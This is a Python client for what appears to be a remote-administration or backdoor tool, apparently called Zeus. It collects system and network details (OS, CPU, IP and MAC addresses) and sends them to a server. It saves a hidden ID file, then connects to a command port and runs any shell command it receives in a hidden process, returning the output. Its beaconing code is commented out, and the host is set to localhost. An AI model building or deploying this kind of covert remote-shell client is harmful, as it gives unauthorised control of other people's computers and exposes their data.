import json
import pprint
import socket
import subprocess
import threading
import time
import netifaces
import uuid
import os
import platform

import psutil
import win32api
import win32con
import pygetwindow as gw

# 设置服务器的IP地址和端口号
server_ip = "127.0.0.1"
server_command_port = 1818
server_inform_port = 1819

client_id = ""


def get_comp_info():
    # 信息获取函数，得到硬件基础信息，网络信息等
    interfaces = netifaces.interfaces()
    date_info = time.strftime("%Y-%m-%d", time.localtime())
    cpu_info = {
        'cpu_logical_cores': psutil.cpu_count(logical=True),
        'cpu_physical_cores': psutil.cpu_count(logical=False),
        'cpu_freq': psutil.cpu_freq(),
        'cpu_percent': psutil.cpu_percent()
    }
    basic_info = {
        'os_info': platform.platform(),
        # 获取操作系统的详细信息
        'system_info': platform.uname(),
        # 获取 CPU 信息
        'cpu_info': cpu_info,
        # 获取内存信息
        'memory_info': psutil.virtual_memory(),
        # 获取硬盘信息
        'disk_info': psutil.disk_partitions()
    }
    network_info = []
    for iface in interfaces:
        try:
            addresses = netifaces.ifaddresses(iface)
            if netifaces.AF_INET in addresses:
                ipv4_addresses = addresses[netifaces.AF_INET]
                mac_address = addresses[netifaces.AF_LINK]
                network_info_frag = {
                    'Interface': iface,
                    'IPV4_address': ipv4_addresses[0]['addr'],
                    'IPV4_netmask': ipv4_addresses[0]['netmask'],
                    'MAC_address': mac_address[0]['addr']
                }
                network_info.append(network_info_frag)
        except ValueError as e:
            print(f"An error occurred during obtaining the network info. {e}")
            pass
    comp_info = {
        'title': "Comprehensive Info",
        'content': {
            'overview': platform.uname()._asdict(),
            'basic_info': basic_info,
            'network_info': network_info,
            'date_stramp': date_info,
            'uuid': client_id
        }
    }

    return comp_info
    # Return Data Format:
    # [{'Interface': '{x}', 'IPV4_address': 'x', 'IPV4_netmask': 'x', 'MAC_address': 'x'},
    # {'Interface': '{x}', 'IPV4_address': 'x', 'IPV4_netmask': 'x', 'MAC_address': 'x'},
    # {'Interface': '{x}', 'IPV4_address': 'x', 'IPV4_netmask': 'x', 'MAC_address': ''},
    # {'Interface': '{x}', 'IPV4_address': 'x', 'IPV4_netmask': 'x', 'MAC_address': 'x'},
    # {'Date': '2023-08-05'}]


def generate_uuid():
    # 得到本机在控制网络中的uuid，其实建议与服务器通信得到该uuid，之后再改
    uuid_file_path = os.path.join(os.path.expanduser("~"), "Zeus_UUID.ini")
    cid = str(uuid.uuid4())
    if os.path.exists(uuid_file_path):
        with open(uuid_file_path, 'r') as f:
            cid = f.read()
            print("The UUID Exists.")
            return str(cid)
    else:
        with open(uuid_file_path, 'w') as f:
            f.write(cid)
            print("Create UUID Successfully.")
            os.chmod(uuid_file_path, 0o600)
            win32api.SetFileAttributes(uuid_file_path, win32con.FILE_ATTRIBUTE_HIDDEN)
            return str(cid)


def get_all_windows():
    f_windows = gw.getAllWindows()
    return f_windows


def initialize_socket(host, port):
    try:
        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sk.connect((host, port))
        return sk
    except ConnectionRefusedError:
        # 该情况是由于目标计算机没有打开端口导致
        print("由于目标计算机积极拒绝，无法连接。")
        return None
    except socket.gaierror:
        # 地址解析错误处理，出现这个错误说明IP不符合IPV4规范，或者因为其它原因无法解析。
        print("无效的服务器地址。")
        return "Invalid IP."
    except KeyboardInterrupt:
        print("User Ended The Connection.(in initializing)")
        socket.close()
    except socket.error:
        print("Socket 对象创建失败。")
    except Exception as e:
        # 其他异常处理，我也不知道会有什么问题
        print(f"连接出错: {str(e)}")
        socket.close()


def get_info(client_socket):
    if client_socket is None:
        return None
    while True:
        try:
            # 设置接收超时时间为 10 秒
            # PS: 这个很有意思，即使是延时，也仍然在监听
            client_socket.settimeout(10)
            response = client_socket.recv(1024)
            response_str = response.decode('gbk').strip()
            if response_str.startswith("Connection Permitted: "):
                response_uuid = response_str[22:]
                print("Server Response UUID: " + response_uuid)
                if response_uuid == client_id:
                    print("Connection permitted, going to connect...")
                    connect_to_server(server_ip, server_command_port)

            else:
                print("Unrecognized Server Message:" + response_str)
        except socket.timeout:
            # 在测试阶段可能经常触发这个except，但是到时候会在服务器端写好keep alive，因此不用担心。
            print("服务器没有回应，等待响应超时")


def send_info(client_socket, send_info_buffer):
    if client_socket is None:
        return None
    try:
        client_socket.sendall(json.dumps(send_info_buffer).encode() + b'\n\n')
        print("已向服务器发送对应数据:" + send_info_buffer)
    except socket.timeout:
        print("连接超时，无法连接到服务器。")
    except Exception as e:
        # 其他异常处理，我也不知道会有什么问题
        print(f"连接出错: {str(e)}")
        socket.close()
    except KeyboardInterrupt:
        print("User Ended The Connection.")
        socket.close()


def connect_to_server(host, port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client_socket.connect((host, port))
        client_socket.send(b"Connection Successfully Built.\n")
        print("已连接到服务器")

        while True:
            data = client_socket.recv(1024)
            if not data:
                print("与服务器断开连接")
                break

            result = execute_command(data)

            client_socket.send(result)
            if result.decode('gbk') == "Connection Detach\n":
                client_socket.close()
                return 0

    except ConnectionRefusedError:
        print("无法连接到服务器")
    except KeyboardInterrupt:
        print("用户中断")
    finally:
        client_socket.close()
        print("已关闭连接")


process = None


def execute_command(command):
    global process

    command = command.decode().strip()
    print("收到指令:", command)

    try:
        if command.startswith('cd'):
            # 切换目录命令
            directory = command.split(' ')[1]
            os.chdir(directory)
            return "目录切换成功\n".encode()

        if command.startswith('Keep Alive'):
            return "Keep Alive\n".encode()

        if command.startswith('rc exit'):
            if process is not None and process.poll() is None:
                # 如果子进程存在且尚未终止，则终止子进程
                process.terminate()
                process.wait()
                process = None
            return "Connection Detached\n".encode()

        else:
            if process is None or process.poll() is not None:
                # 如果没有子进程或子进程已经终止，则创建新的子进程
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    creationflags=subprocess.CREATE_NO_WINDOW  # 不显示窗口
                )
            else:
                # 如果子进程存在且尚未终止，则发送指令给子进程
                process.stdin.write(command.encode() + b'\n')
                process.stdin.flush()

        result = process.communicate()[0]
        print(result)
        return result
    except subprocess.CalledProcessError as e:
        error_msg = "命令执行失败: " + str(e)
        print(error_msg)
        return error_msg.encode()
    except Exception as e:
        print("An error occurred:", e)


if __name__ == "__main__":
    # try:
    #     client_id = generate_uuid()
    #     print(client_id)
    #     info_socket = initialize_socket(server_ip, server_inform_port)
    #
    #     comprehension_info = get_comp_info()
    #     get_info_thread = threading.Thread(target=get_info, args=(info_socket,))
    #     # 多线程，将监听端口单独放出，便于管理
    #     get_info_thread.start()
    #     send_info(info_socket, comprehension_info)
    #     # connect_to_server(server_ip, server_command_port)
    #     # # # A debug above # # #
    #
    # except KeyboardInterrupt:
    #     print("User Ended The Connection.Global.")
    # except Exception as e:
    #     print("Error, code:" + str(e))
    windows = get_all_windows()
    print(windows)
    for window in windows:
        print(f"Window title: {window.title}, "
              f"Visibility: {window.visible}, "
              f"Height: {window.height}, "
              f"width: {window.width},"
              f"isMinimized: {window.isMinimized}, "
              f"isMaximized: {window.isMaximized}, "
              f"isActive: {window.isActive}")
